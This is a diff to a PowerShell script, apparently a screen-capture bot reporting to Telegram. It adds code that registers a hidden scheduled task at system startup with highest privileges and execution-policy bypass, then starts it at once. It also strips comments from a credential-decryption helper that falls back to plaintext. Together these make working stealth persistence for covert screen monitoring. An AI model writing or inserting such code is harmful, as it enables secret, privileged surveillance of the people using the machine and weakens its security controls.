@@ -1,3 +1,35 @@
+param(
+    [switch]$background
+)
+
+# -------------------------------
+# If not running in background mode, register a scheduled task and exit
+# -------------------------------
+if (-not $background) {
+    $taskName = "ScreenCaptureTelegramBot"
+    try {
+        # Check if task already exists
+        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+    }
+    catch { $existingTask = $null }
+
+    if (-not $existingTask) {
+        # Get the full path to the current script
+        $scriptPath = $MyInvocation.MyCommand.Definition
+
+        # Create the task action to run the script with the -background switch, hidden.
+        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -background"
+        # Create a trigger to run the task at system startup
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        # Register the scheduled task (requires appropriate permissions)
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force
+        Write-Output "Scheduled task '$taskName' registered. It will run in the background at startup."
+        # Optionally, start the task immediately
+        Start-ScheduledTask -TaskName $taskName
+        exit
+    }
+}
+
 # ===============================
 # Enable DPI Awareness to capture full resolution on high DPI screens
 # ===============================
@@ -35,12 +67,10 @@ function Decrypt-Credential {
             return $plain
         }
         catch {
-            # If conversion fails, fall back to plain text
             return $EncryptedString
         }
     }
     else {
-        # Otherwise, assume the credential is plain text
         return $EncryptedString
     }
 }
